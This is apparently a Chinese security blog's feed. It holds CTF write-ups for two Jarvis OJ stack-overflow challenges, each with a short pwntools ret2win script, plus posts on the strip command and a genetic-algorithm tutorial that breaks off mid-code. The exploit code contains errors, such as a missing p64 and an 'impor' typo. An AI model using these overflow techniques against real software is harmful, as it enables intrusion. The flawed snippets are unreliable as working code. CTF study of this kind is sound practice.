    <content type="html"><![CDATA[<p>[TOC]</p><h1 id="Pwn-10月21-jarvis-level0"><a href="#Pwn-10月21-jarvis-level0" class="headerlink" title="Pwn-10月21-jarvis-level0"></a>Pwn-10月21-jarvis-level0</h1><blockquote><p>这题是补上昨天没写完的一题。。。虽然很简单😭😭</p></blockquote><h2 id="检查保护措施"><a href="#检查保护措施" class="headerlink" title="检查保护措施"></a>检查保护措施</h2><blockquote><p><code>file level0</code> and <code>checksec level0</code>:</p><p><img src="https://i.loli.net/2018/10/21/5bcbd13050ba5.png" alt=""></p><p>可以看到这种简单的pwn题基本不开保护措施，不然菜鸡我也玩不下去。。。</p></blockquote><h2 id="静态分析程序逻辑"><a href="#静态分析程序逻辑" class="headerlink" title="静态分析程序逻辑"></a>静态分析程序逻辑</h2><blockquote><p>一用IDA Pro打开程序文件看看main函数就脑残地看到了<code>return vulnerable_function()</code></p><p><img src="https://i.loli.net/2018/10/21/5bcbd173656cc.png" alt=""></p><p>跟着去这个函数看一看:</p><p><img src="https://i.loli.net/2018/10/21/5bcbd20189ae1.png" alt=""></p><p>可以看到定义的buf空间为0x80,而能够用read函数读取的为0x200，能够造成栈溢出，并且实现函数地址覆盖。而且我们也可以看到一个callsystem函数，点进去看看可以发现<code>system(&quot;/bin/sh&quot;)</code>:</p><p><img src="https://i.loli.net/2018/10/21/5bcbd2752027e.png" alt=""></p><p>那么根据静态分析出来的信息大概可以确定：首先通过main函数返回到vulnerable_function函数，然后通过vulnerable_function函数将某处返回地址覆盖为callsystem函数的地址，然后getshell。</p></blockquote><h2 id="动态分析程序逻辑"><a href="#动态分析程序逻辑" class="headerlink" title="动态分析程序逻辑"></a>动态分析程序逻辑</h2><blockquote><p>gdb 调试一下level0，先单步执行到vulnerable_function()函数：</p><p><img src="https://i.loli.net/2018/10/21/5bcbd5dc96afe.png" alt=""></p><p>先过一遍该函数，然后记录关键信息：</p><p><img src="https://i.loli.net/2018/10/21/5bcbd6954fadf.png" alt=""></p><p>计算一下距离：<code>hex(0x7fffffffdfc0 + 8 - 0x7fffffffdf40) = 0x88</code>，那为什么比定义的0x80要多0x08的距离呢？这里我们可以通过ida pro的<code>alt + k</code>快捷键查看buf的栈帧，会发现：</p><p><img src="https://i.loli.net/2018/10/21/5bcbd939b1a8b.png" alt=""></p><p>通过gdb调试里面的多个关键信息对比，其实多出来的0x08是栈底的内容，继续下一步，就可以看到最开始被压入栈中的返回地址被置栈顶，准备返回：</p><p><img src="https://i.loli.net/2018/10/21/5bcbda659d6b6.png" alt=""></p><p>那么我们就可以开始构造exp啦😄。</p></blockquote><h2 id="攻破"><a href="#攻破" class="headerlink" title="攻破"></a>攻破</h2><blockquote><p>通过上面的逻辑我们可以写出如下exp：</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#coding:utf-8</span>Author <span class="token operator">=</span> <span class="token string">"Yof3ng"</span><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"level0"</span><span class="token punctuation">)</span>callsystem_addr <span class="token operator">=</span> <span class="token number">0x400596</span>padding <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token number">0x80</span> <span class="token operator">+</span> <span class="token number">0x08</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token string">"a"</span>payload <span class="token operator">=</span> padding <span class="token operator">+</span> callsystem_addrio<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre></blockquote><p>运行效果：</p><p><img src="https://i.loli.net/2018/10/21/5bcbdc2dbe46c.png" alt=""></p><p>然后就getshell啦😍。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;[TOC]&lt;/p&gt;
&lt;h1 id=&quot;Pwn-10月21-jarvis-level0&quot;&gt;&lt;a href=&quot;#Pwn-10月21-jarvis-level0&quot; class=&quot;headerlink&quot; title=&quot;Pwn-10月21-jarvis-level0&quot;&gt;&lt;/a&gt;Pwn-
      
    
    </summary>
    
      <category term="CTF" scheme="http://www.yof3ng.xyz/categories/CTF/"/>
    
    
      <category term="Pwn" scheme="http://www.yof3ng.xyz/tags/Pwn/"/>
    
      <category term="CTF" scheme="http://www.yof3ng.xyz/tags/CTF/"/>
    
      <category term="二进制安全" scheme="http://www.yof3ng.xyz/tags/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>Pwn-10月20-one-of-jarvis</title>
    <link href="http://www.yof3ng.xyz/2018/10/20/Pwn-10%E6%9C%8820-two-of-jarvis/"/>
    <id>http://www.yof3ng.xyz/2018/10/20/Pwn-10月20-two-of-jarvis/</id>
    <published>2018-10-20T14:48:18.000Z</published>
    <updated>2018-10-20T16:07:46.818Z</updated>
    
    <content type="html"><![CDATA[<p>[TOC]</p><h1 id="Pwn-10月20-jarvis-Tell-me-something"><a href="#Pwn-10月20-jarvis-Tell-me-something" class="headerlink" title="Pwn-10月20-jarvis-Tell_me_something"></a>Pwn-10月20-jarvis-Tell_me_something</h1><blockquote><p>今天简单地做一下jarvis oj的两道题，<code>level0</code>和<code>Tell_me_something</code>.</p><p>PS:凌晨0:07  明天写level0，其实两题差不多的逻辑，挺简单的。</p></blockquote><h2 id="Tell-me-something"><a href="#Tell-me-something" class="headerlink" title="Tell_me_something"></a>Tell_me_something</h2><h3 id="检查保护措施"><a href="#检查保护措施" class="headerlink" title="检查保护措施"></a>检查保护措施</h3><blockquote><p>首先，<code>file gestbook</code>and<code>checksec guestbook</code>，简单地看看文件信息和保护措施</p><p><img src="https://i.loli.net/2018/10/20/5bcb420ce98b7.png" alt=""></p><p>可以看到它是没有脱衣服的，然后没有开启保护措施。</p></blockquote><h3 id="静态分析程序逻辑"><a href="#静态分析程序逻辑" class="headerlink" title="静态分析程序逻辑"></a>静态分析程序逻辑</h3><blockquote><p>用IDA pro 看一下该程序的汇编代码，可以看到main函数：</p><p><img src="https://i.loli.net/2018/10/20/5bcb42684db9f.png" alt=""></p><p>F5大法，看看伪代码，很简单就可以判断出溢出点，因为read函数可以将超出0x88大小的数据读入栈空间：</p><p><img src="https://i.loli.net/2018/10/20/5bcb42f7dd043.png" alt=""></p><p>然后我们也可以看到good_game函数里面有我们要的关键信息：</p><p><img src="https://i.loli.net/2018/10/20/5bcb498c0b0c9.png" alt=""></p><p>那么到这里基本上可以确定，是通过溢出来使程序跳转到good_game函数从而得到flag。</p></blockquote><h3 id="动态分析程序逻辑"><a href="#动态分析程序逻辑" class="headerlink" title="动态分析程序逻辑"></a>动态分析程序逻辑</h3><blockquote><p>首先放linux里面跑一跑：</p><p><img src="https://i.loli.net/2018/10/20/5bcb48a91dfc9.png" alt=""></p><p>确实产生了溢出的问题，然后这里我们用一下linux平台的一个二进制分析软件，radare2，说实话还是可以用的，这个软件集成了很多工具，并且也可以进行部分地动态调试（<a href="https://xz.aliyun.com/t/1514/#toc-7" target="_blank" rel="noopener">radare2详细教程</a>）：</p><p><img src="https://i.loli.net/2018/10/20/5bcb495987b21.png" alt=""></p><p>接下来我们用gdb调试一下，先构造一个0x88长度的padding输入，再看看栈空间：</p><p><img src="https://i.loli.net/2018/10/20/5bcb4c838d5dd.png" alt=""></p><p>可以知道将长度为0x88的padding填充到栈空间之后，还可以进行覆盖，因为可以读取最大0x100（256）大小的字符，而ebp栈底出界就是一个函数地址，我们可以看看这个函数地址有什么关键性的操作举动：</p><p><img src="https://i.loli.net/2018/10/20/5bcb4d6959622.png" alt=""></p><p>进行单步执行测试查看该溢出点能够被覆盖的地址是否会被返回，先重新查看一下该栈位置存储的函数地址为多少：</p><p><img src="https://i.loli.net/2018/10/20/5bcb4f4e7f83a.png" alt=""></p><p>可以看到存储的函数地址为0x7ffff7a3fa87，到栈位置即将改变时，进行下一步验证：</p><p><img src="https://i.loli.net/2018/10/20/5bcb4e0d8a46d.png" alt=""></p><p>执行下一步：</p><p><img src="https://i.loli.net/2018/10/20/5bcb4e84bc436.png" alt=""></p><p>再下一步就将该函数地址放入了RIP，作为下一步运行的函数指令：<br><img src="https://i.loli.net/2018/10/20/5bcb4ed83e345.png" alt=""></p><p>那么到这里已经明白可以返回该地址覆盖的内容，写exp了。</p></blockquote><h3 id="攻破"><a href="#攻破" class="headerlink" title="攻破"></a>攻破</h3><blockquote><p>用0x88长度的内容做padding，然后将good_game的地址放到尾部，然后执行即可。</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#coding:utf-8</span><span class="token comment" spellcheck="true">#exp.py</span>Author <span class="token operator">=</span> <span class="token string">"Yof3ng"</span><span class="token keyword">from</span> pwn impor <span class="token operator">*</span>io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'guestbook'</span><span class="token punctuation">)</span>good_game_addr <span class="token operator">=</span> <span class="token number">0x400620</span>padding <span class="token operator">=</span> <span class="token string">'a'</span><span class="token operator">*</span><span class="token number">0x88</span>payload <span class="token operator">=</span> padding <span class="token operator">+</span> p64<span class="token punctuation">(</span>good_game_addr<span class="token punctuation">)</span>io<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token keyword">print</span> io<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">print</span> io<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre></blockquote><p>运行结果：</p><p><img src="https://i.loli.net/2018/10/21/5bcb5203a355b.png" alt=""></p><p>啊本来今天打算写两题的博客，看来这篇只能水了，太晚了先睡了。😭😭</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;[TOC]&lt;/p&gt;
&lt;h1 id=&quot;Pwn-10月20-jarvis-Tell-me-something&quot;&gt;&lt;a href=&quot;#Pwn-10月20-jarvis-Tell-me-something&quot; class=&quot;headerlink&quot; title=&quot;Pwn-10月20-j
      
    
    </summary>
    
      <category term="CTF" scheme="http://www.yof3ng.xyz/categories/CTF/"/>
    
    
      <category term="Pwn" scheme="http://www.yof3ng.xyz/tags/Pwn/"/>
    
      <category term="CTF" scheme="http://www.yof3ng.xyz/tags/CTF/"/>
    
      <category term="二进制安全" scheme="http://www.yof3ng.xyz/tags/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>Pwn-10月17-strip</title>
    <link href="http://www.yof3ng.xyz/2018/10/17/Pwn-10%E6%9C%8817-strip/"/>
    <id>http://www.yof3ng.xyz/2018/10/17/Pwn-10月17-strip/</id>
    <published>2018-10-17T15:27:29.000Z</published>
    <updated>2018-10-17T15:58:01.279Z</updated>
    
    <content type="html"><![CDATA[<p>[TOC]</p><h1 id="Pwn-10月17-strip"><a href="#Pwn-10月17-strip" class="headerlink" title="Pwn-10月17-strip"></a>Pwn-10月17-strip</h1><blockquote><p>strip是linux下的一个命令，用于给特定文件消除，剥离一些符号信息和调试信息，通常被叫做“脱衣服”，可以减小可执行文件的体积，又不影响其运行，但是当这种程序出现在二进制分析中就比较麻烦了，因为用strip命令处理过的程序，反编译可能会比较混乱，有时候也需要恢复符号表来完成分析。</p><p>简单编译一个test.c文件，脱脱衣服试试：</p><p><img src="https://i.loli.net/2018/10/17/5bc759646ed19.png" alt=""></p><p>可以看到编译后的test文件信息，not stripped，这里再用到linux下的nm命令，是names的缩写，能够列出文件的符号值，函数和全局变量等信息，更官方一点的就是这样的解释：<code>nm工具列出.o文件、.a文件、.so文件等的符号信息，包括诸如符号的值，符号类型及符号名称等。所谓符号，通常指定义出的函数，全局变量等等。</code>。</p><p><img src="https://i.loli.net/2018/10/17/5bc75a09ec273.png" alt=""></p><p>像 hacklu2018的一个题，就是脱了衣服的，没有符号表：</p><p><img src="https://i.loli.net/2018/10/17/5bc75aa3b1afa.png" alt=""></p><p>那么给test文件脱一下试试：</p><p><img src="https://i.loli.net/2018/10/17/5bc75ae6dcb39.png" alt=""></p><p>可以看到符号表已经被脱下，并且不影响正常运行。</p></blockquote>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;[TOC]&lt;/p&gt;
&lt;h1 id=&quot;Pwn-10月17-strip&quot;&gt;&lt;a href=&quot;#Pwn-10月17-strip&quot; class=&quot;headerlink&quot; title=&quot;Pwn-10月17-strip&quot;&gt;&lt;/a&gt;Pwn-10月17-strip&lt;/h1&gt;&lt;blockqu
      
    
    </summary>
    
      <category term="CTF" scheme="http://www.yof3ng.xyz/categories/CTF/"/>
    
    
      <category term="Pwn" scheme="http://www.yof3ng.xyz/tags/Pwn/"/>
    
      <category term="linux" scheme="http://www.yof3ng.xyz/tags/linux/"/>
    
  </entry>
  
  <entry>
    <title>遗传算法</title>
    <link href="http://www.yof3ng.xyz/2018/10/17/%E9%81%97%E4%BC%A0%E7%AE%97%E6%B3%95/"/>
    <id>http://www.yof3ng.xyz/2018/10/17/遗传算法/</id>
    <published>2018-10-17T11:26:39.000Z</published>
    <updated>2018-10-18T13:16:58.968Z</updated>
    
    <content type="html"><![CDATA[<p>[TOC]</p><h1 id="遗传算法（Genetic-Algorithm）"><a href="#遗传算法（Genetic-Algorithm）" class="headerlink" title="遗传算法（Genetic Algorithm）"></a>遗传算法（Genetic Algorithm）</h1><blockquote><p>算法都是用来解决实际问题，提高效率的，而学好算法对一个信息安全从业者来说，应该也是必要的。开始接触这些算法，也逐渐意识到知识面广阔的重要，比如遗传算法就需要知道一定的生物知识，可能这就是培训机构无法弥补的地方吧。</p></blockquote><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>先引用一下遗传算法的解释：</p><blockquote><p>&nbsp; &nbsp; &nbsp; &nbsp; <strong>遗传算法（Genetic Algorithm）</strong>是模拟达尔文生物进化论的自然选择和遗传学机理的生物进化过程的计算模型，是一种通过模拟自然进化过程搜索最优解的方法。遗传算法是从代表问题可能潜在的解集的一个<strong>种群（population）</strong>开始的，而一个种群则由经过<strong>基因（gene）</strong>编码的一定数目的<strong>个体(individual)</strong>组成。</p><p>&nbsp; &nbsp; &nbsp; &nbsp; 每个个体实际上是<strong>染色体(chromosome)</strong>带有特征的实体。染色体作为遗传物质的主要载体，即多个基因的集合，其内部表现（即基因型）是某种基因组合，它决定了个体的形状的外部表现，如黑头发的特征是由染色体中控制这一特征的某种基因组合决定的。因此，在一开始需要实现从表现型到基因型的映射即编码工作。由于仿照基因编码的工作很复杂，我们往往进行简化，如<strong>二进制编码</strong>，初代种群产生之后，按照适者生存和优胜劣汰的原理，<strong>逐代（generation）</strong>演化产生出越来越好的近似解，在每一代，根据问题域中个体的<strong>适应度（fitness）</strong>大小<strong>选择（selection）</strong>个体，并借助于<strong>自然遗传学的遗传算子（genetic operators）</strong>进行<strong>组合交叉（crossover）和变异（mutation）</strong>，产生出代表新的解集的种群。这个过程将导致种群像<strong>自然进化</strong>一样的后生代种群比前代更加适应于环境，末代种群中的最优个体经过<strong>解码（decoding）</strong>，可以作为问题近似最优解。</p><p>遗传算法的组成主要包括4个部分：<br>（1）编码<br>（2）适应度函数<br>（3）遗传算子（选择，交叉，变异）<br>（4）运行参数 </p><p><strong>选择、交叉和变异</strong>构成了遗传算法的遗传操作；<strong>参数编码、初始群体的设定、适应度函数的设计、遗传操作设计、控制参数</strong>设定五个要素组成了遗传算法的核心内容。</p><p><img src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20181018083211.png" alt=""></p></blockquote><h2 id="编码与解码"><a href="#编码与解码" class="headerlink" title="编码与解码"></a>编码与解码</h2><blockquote><p>&nbsp; &nbsp; &nbsp; &nbsp; 遗传算法的实行，首先需要确定编码和解码的形式，生物体的遗传就是通过染色体以及基因进行，编码形式多种多样，能够使用字母，实数，或者是二进制来进行编码。但是因为博主刚开始学遗传算法，便拿SGA（基本遗传算法）来对遗传算法进行一个简单的理解。</p><p>直接上例题说明：</p><p><img src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20181018095823.png" alt=""></p><p>我们需要求此函数在[-2,2]区间下的最大值，先用python画一下函数图形。</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#coding:utf-8</span>__Author__ <span class="token operator">=</span> <span class="token string">"Yof3ng"</span><span class="token keyword">import</span> math<span class="token keyword">import</span> numpy <span class="token keyword">as</span> np<span class="token keyword">import</span> matplotlib<span class="token punctuation">.</span>pyplot <span class="token keyword">as</span> pltx <span class="token operator">=</span> np<span class="token punctuation">.</span>linspace<span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">10000</span><span class="token punctuation">)</span>y<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token comment" spellcheck="true">#通过循环计算每一个x值对应的y值</span><span class="token keyword">for</span> i <span class="token keyword">in</span> x<span class="token punctuation">:</span>    a<span class="token operator">=</span> <span class="token number">200</span><span class="token operator">*</span>np<span class="token punctuation">.</span>exp<span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">0.05</span><span class="token operator">*</span>i<span class="token punctuation">)</span><span class="token operator">*</span><span class="token punctuation">(</span>math<span class="token punctuation">.</span>sin<span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span>    y<span class="token punctuation">.</span>append<span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token comment" spellcheck="true">#通过matplotlib库绘出函数图形</span>plt<span class="token punctuation">.</span>plot<span class="token punctuation">(</span>x<span class="token punctuation">,</span>y<span class="token punctuation">)</span>plt<span class="token punctuation">.</span>annotate<span class="token punctuation">(</span><span class="token string">'local max'</span><span class="token punctuation">,</span> xy<span class="token operator">=</span><span class="token punctuation">(</span><span class="token number">1.4</span><span class="token punctuation">,</span> max<span class="token punctuation">(</span>y<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> xytext<span class="token operator">=</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">200</span><span class="token punctuation">)</span><span class="token punctuation">,</span>            arrowprops<span class="token operator">=</span>dict<span class="token punctuation">(</span>facecolor<span class="token operator">=</span><span class="token string">'black'</span><span class="token punctuation">,</span> shrink<span class="token operator">=</span><span class="token number">0.05</span><span class="token punctuation">)</span><span class="token punctuation">,</span>            <span class="token punctuation">)</span>plt<span class="token punctuation">.</span>show<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>函数图像如下：</p><p><img src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20181018183218.png" alt=""></p><p>[-2,2]区间已经分为10000个等份，而我们需要找出最大值，SGA基本遗传算法就是用二进制编码来表示的，那么我们把2^14，即十四位二进制用作编码来表示个体：</p><p><img src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20181018105024.png" alt=""></p></blockquote><h2 id="初始化种群"><a href="#初始化种群" class="headerlink" title="初始化种群"></a>初始化种群</h2><blockquote><p>已经决定用十四位二进制来表示种群个体了，那么我们就可以对种群进行初始化：</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#初始化种群个体</span><span class="token keyword">def</span> <span class="token function">Init_popu</span><span class="token punctuation">(</span>number<span class="token punctuation">)</span><span class="token punctuation">:</span>    population<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token keyword">for</span> i  <span class="token keyword">in</span> range<span class="token punctuation">(</span>number<span class="token punctuation">)</span><span class="token punctuation">:</span>        entity<span class="token operator">=</span><span class="token string">''</span>       <span class="token comment" spellcheck="true">#随机产生个体</span>        <span class="token keyword">for</span> j <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">14</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            entity <span class="token operator">=</span> entity<span class="token operator">+</span>str<span class="token punctuation">(</span>np<span class="token punctuation">.</span>random<span class="token punctuation">.</span>randint<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        population<span class="token punctuation">.</span>append<span class="token punctuation">(</span>entity<span class="token punctuation">)</span>    <span class="token keyword">return</span> population</code></pre><p>将种群初始化编码后，自定义解码方法：</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#解码</span><span class="token keyword">def</span> <span class="token function">Decode</span><span class="token punctuation">(</span>population<span class="token punctuation">)</span><span class="token punctuation">:</span>   flag <span class="token operator">=</span> <span class="token number">0</span>   Dpopulation <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>   <span class="token comment" spellcheck="true">#print(population)</span>   <span class="token keyword">for</span> i <span class="token keyword">in</span> population<span class="token punctuation">:</span>       <span class="token comment" spellcheck="true">#将二进制转换为整型数值</span>       x <span class="token operator">=</span> eval<span class="token punctuation">(</span><span class="token string">'0b'</span><span class="token operator">+</span>i<span class="token punctuation">)</span>       x <span class="token operator">=</span> x<span class="token operator">/</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token operator">**</span><span class="token number">14</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">4</span><span class="token operator">-</span><span class="token number">2</span>       Dpopulation<span class="token punctuation">.</span>append<span class="token punctuation">(</span>x<span class="token punctuation">)</span>       <span class="token comment" spellcheck="true"># someone = str(population[flag])</span>       <span class="token comment" spellcheck="true"># express[i] = DNAdict[someone]</span>   <span class="token keyword">return</span> population<span class="token punctuation">,</span>Dpopulation   <span class="token comment" spellcheck="true">#return express</span>   <span class="token comment" spellcheck="true"># print(bx[0:100])</span>   <span class="token comment" spellcheck="true"># print(ast.literal_eval('0b'+bx[1]))</span></code></pre></blockquote><h2 id="计算适应度"><a href="#计算适应度" class="headerlink" title="计算适应度"></a>计算适应度</h2><blockquote><p>根据种群个体的适应度我们可以进行后面的选择淘汰方法，不同的问题有不同的适应度计算方法<br> 而本例题则，直接用目标函数作为适应度函数</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#根据函数原型计算表现型（y值)，即适应度</span><span class="token keyword">def</span> <span class="token function">gafunction</span><span class="token punctuation">(</span>population<span class="token punctuation">,</span>dpopulation<span class="token punctuation">)</span><span class="token punctuation">:</span>    y<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span>    flag<span class="token operator">=</span><span class="token number">0</span>    pp<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token comment" spellcheck="true">#通过循环计算每一个x值对应的y值</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> dpopulation<span class="token punctuation">:</span>        a<span class="token operator">=</span> <span class="token number">200</span><span class="token operator">*</span>np<span class="token punctuation">.</span>exp<span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">0.05</span><span class="token operator">*</span>i<span class="token punctuation">)</span><span class="token operator">*</span><span class="token punctuation">(</span>math<span class="token punctuation">.</span>sin<span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span>        y<span class="token punctuation">.</span>append<span class="token punctuation">(</span>a<span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#由于是计算最大值，若存在正数则直接去除负数个体</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> y<span class="token punctuation">:</span>        <span class="token keyword">if</span> i<span class="token operator">></span><span class="token number">0</span><span class="token punctuation">:</span>            flag<span class="token operator">=</span><span class="token number">1</span>    yy <span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span>    n<span class="token operator">=</span><span class="token number">0</span>    <span class="token keyword">if</span> flag<span class="token operator">==</span><span class="token number">1</span><span class="token punctuation">:</span>        <span class="token keyword">for</span> i <span class="token keyword">in</span> y<span class="token punctuation">:</span>            <span class="token keyword">if</span> i<span class="token operator">></span><span class="token number">0</span><span class="token punctuation">:</span>                yy<span class="token punctuation">.</span>append<span class="token punctuation">(</span>i<span class="token punctuation">)</span>                pp<span class="token punctuation">.</span>append<span class="token punctuation">(</span>population<span class="token punctuation">[</span>n<span class="token punctuation">]</span><span class="token punctuation">)</span>            n<span class="token operator">+=</span><span class="token number">1</span>        <span class="token keyword">return</span> yy<span class="token punctuation">,</span>pp    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> y<span class="token punctuation">,</span>population</code></pre></blockquote><h2 id="定义选择方法"><a href="#定义选择方法" class="headerlink" title="定义选择方法"></a>定义选择方法</h2><blockquote><p>个体生存概率公式：</p><p><img src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20181018105143.png" alt=""></p></blockquote><blockquote><p><img src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20181018145013.png" alt=""></p><p>根据适应度以及遗传概率，进行选择：</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#定义物竞天择,弱者淘汰</span><span class="token keyword">def</span> <span class="token function">selection</span><span class="token punctuation">(</span>population<span class="token punctuation">,</span>y<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment" spellcheck="true">#轮盘赌选择,染色体累计概率</span>    fitness_sum<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span>len<span class="token punctuation">(</span>y<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> i<span class="token operator">==</span><span class="token number">0</span><span class="token punctuation">:</span>            fitness_sum<span class="token punctuation">.</span>append<span class="token punctuation">(</span>y<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            fitness_sum<span class="token punctuation">.</span>append<span class="token punctuation">(</span>fitness_sum<span class="token punctuation">[</span>i<span class="token number">-1</span><span class="token punctuation">]</span><span class="token operator">+</span>y<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span>len<span class="token punctuation">(</span>fitness_sum<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        fitness_sum<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">/=</span>sum<span class="token punctuation">(</span>y<span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#进行选择，淘汰弱者，获取新种群</span>    population_new<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span>len<span class="token punctuation">(</span>y<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        rand<span class="token operator">=</span>np<span class="token punctuation">.</span>random<span class="token punctuation">.</span>uniform<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span>        <span class="token keyword">for</span> j <span class="token keyword">in</span> range<span class="token punctuation">(</span>len<span class="token punctuation">(</span>y<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">if</span> j<span class="token operator">==</span><span class="token number">0</span><span class="token punctuation">:</span>                <span class="token keyword">if</span> <span class="token number">0</span><span class="token operator">&lt;</span>rand <span class="token operator">and</span> rand<span class="token operator">&lt;=</span>fitness_sum<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">:</span>                    population_new<span class="token punctuation">.</span>append<span class="token punctuation">(</span>population<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">)</span>            <span class="token keyword">else</span><span class="token punctuation">:</span>                <span class="token keyword">if</span> fitness_sum<span class="token punctuation">[</span>j<span class="token number">-1</span><span class="token punctuation">]</span><span class="token operator">&lt;</span>rand <span class="token operator">and</span> rand<span class="token operator">&lt;=</span>fitness_sum<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">:</span>                    population_new<span class="token punctuation">.</span>append<span class="token punctuation">(</span>population<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">)</span>    flag <span class="token operator">=</span> <span class="token number">0</span>    new_population<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token comment" spellcheck="true">#留下优秀个体</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> set<span class="token punctuation">(</span>population_new<span class="token punctuation">)</span><span class="token punctuation">:</span>        new_population<span class="token punctuation">.</span>append<span class="token punctuation">(</span>i<span class="token punctuation">)</span>    <span class="token keyword">return</span> new_population    <span class="token comment" spellcheck="true">#return population_new</span></code></pre></blockquote><h2 id="定义交叉方法"><a href="#定义交叉方法" class="headerlink" title="定义交叉方法"></a>定义交叉方法</h2><blockquote><p>像染色体一样，也进行交叉操作，并且给与交叉操作产生的概率：</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#交叉算子</span><span class="token comment" spellcheck="true">#population_new为选择下来的种群，pc为交叉概率</span><span class="token keyword">def</span> <span class="token function">crossover</span><span class="token punctuation">(</span>population_new<span class="token punctuation">,</span> pc<span class="token punctuation">)</span><span class="token punctuation">:</span>    half<span class="token operator">=</span>int<span class="token punctuation">(</span>len<span class="token punctuation">(</span>population_new<span class="token punctuation">)</span><span class="token operator">/</span><span class="token number">2</span><span class="token punctuation">)</span>    father<span class="token operator">=</span>population_new<span class="token punctuation">[</span><span class="token punctuation">:</span>half<span class="token punctuation">]</span>    mother<span class="token operator">=</span>population_new<span class="token 